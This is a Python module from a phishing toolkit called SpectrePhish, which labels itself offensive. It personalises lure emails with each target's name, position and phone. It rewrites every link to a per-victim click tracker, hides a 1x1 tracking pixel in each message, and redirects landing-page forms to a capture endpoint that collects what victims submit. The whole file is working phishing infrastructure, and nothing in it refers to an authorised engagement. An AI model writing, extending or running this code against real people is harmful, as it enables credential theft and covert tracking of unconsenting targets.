"""
SpectrePhish :: core/render.py
Variable substitution and tracking injection.

Offensive logic: every outbound link must be uniquely attributable. Each
target gets a token, every anchor is rewritten to a click endpoint, and a
1x1 pixel carries the open signal. Nothing shared, nothing guessable.

Public API (imported by main.py and core/server.py -- do not rename):
  render, prepare_email, prepare_landing, target_context, strip_tags

Author : Inayat Hussain
"""

from __future__ import annotations

import re
from html import unescape

from config import TRACK_CLICK, TRACK_PIXEL

VAR_RE = re.compile(r"\{\{\s*\.?([A-Za-z0-9_]+)\s*\}\}")
ANCHOR_RE = re.compile(r"""<a\s+([^>]*?)href\s*=\s*["']([^"']+)["']([^>]*)>""", re.I)
FORM_RE = re.compile(r"""<form\s+([^>]*?)action\s*=\s*["']([^"']*)["']([^>]*)>""", re.I)
BODY_RE = re.compile(r"</body>", re.I)

PIXEL = ('<img src="{base}/{pixel}/{token}.gif" width="1" height="1" '
         'alt="" style="display:block;border:0" />')


# ==========================================================================
def render(template: str, ctx: dict) -> str:
    """Substitute {{.Var}} tokens from ctx. Unknown tokens pass through."""
    def sub(match):
        key = match.group(1)
        if key in ctx:
            return str(ctx[key])
        for k, v in ctx.items():
            if k.lower() == key.lower():
                return str(v)
        return match.group(0)
    return VAR_RE.sub(sub, template or "")


# ==========================================================================
def rewrite_anchors(html: str, base: str, token: str,
                    skip=("mailto:", "#")) -> tuple:
    """Point every anchor at the click tracker. Returns (html, link_count)."""
    count = 0

    def sub(match):
        nonlocal count
        pre, href, post = match.group(1), match.group(2), match.group(3)
        if href.startswith(skip) or not href.strip():
            return match.group(0)
        count += 1
        url = f"{base}/{TRACK_CLICK}/{token}/{count}"
        return f'<a {pre}href="{url}"{post}>'

    return ANCHOR_RE.sub(sub, html or ""), count


def rewrite_form(html: str, base: str, token: str) -> str:
    """Point every form at the capture endpoint for this token."""
    def sub(match):
        pre, _action, post = match.group(1), match.group(2), match.group(3)
        return f'<form {pre}action="{base}/s/{token}"{post}>'
    return FORM_RE.sub(sub, html or "")


def inject_pixel(html: str, base: str, token: str) -> str:
    """Append the 1x1 open-tracking pixel before </body>."""
    pixel = PIXEL.format(base=base, pixel=TRACK_PIXEL, token=token)
    if BODY_RE.search(html or ""):
        return BODY_RE.sub(pixel + "</body>", html, count=1)
    return (html or "") + pixel


def prepare_email(html: str, base: str, token: str) -> tuple:
    """Full email prep: rewrite links, inject pixel. Returns (html, link_count)."""
    html = html or ""
    html, links = rewrite_anchors(html, base, token)
    html = inject_pixel(html, base, token)
    return html, links


def prepare_landing(html: str, base: str, token: str) -> str:
    """Landing prep: point the form at the capture endpoint."""
    return rewrite_form(html or "", base, token)


# ==========================================================================
def target_context(target: dict, base: str, token: str, extra=None) -> dict:
    """Build the substitution context for one target."""
    domain = (target.get("email", "").split("@")[-1] or "company.local")
    ctx = {
        "Email": target.get("email", ""),
        "EmailAddress": target.get("email", ""),
        "FirstName": target.get("first_name", "") or "there",
        "LastName": target.get("last_name", ""),
        "Position": target.get("position", ""),
        "Phone": target.get("phone", ""),
        "URL": f"{base}/s/{token}",
        "TrackingURL": f"{base}/s/{token}",
        "Domain": domain,
        "RId": token,
        "Sender": "A colleague",
        "Custom1": target.get("custom1", ""),
        "Custom2": target.get("custom2", ""),
        "Custom3": target.get("custom3", ""),
    }
    ctx.update(extra or {})
    return ctx


def strip_tags(html: str) -> str:
    """Plaintext alternative derived from the HTML part."""
    text = re.sub(r"<(script|style)[^>]*>.*?</\1>", " ", html or "",
                  flags=re.I | re.S)
    text = re.sub(r"<br\s*/?>", "\n", text, flags=re.I)
    text = re.sub(r"</p>", "\n\n", text, flags=re.I)
    text = re.sub(r"<[^>]+>", "", text)
    return re.sub(r"\n{3,}", "\n\n", unescape(text)).strip()
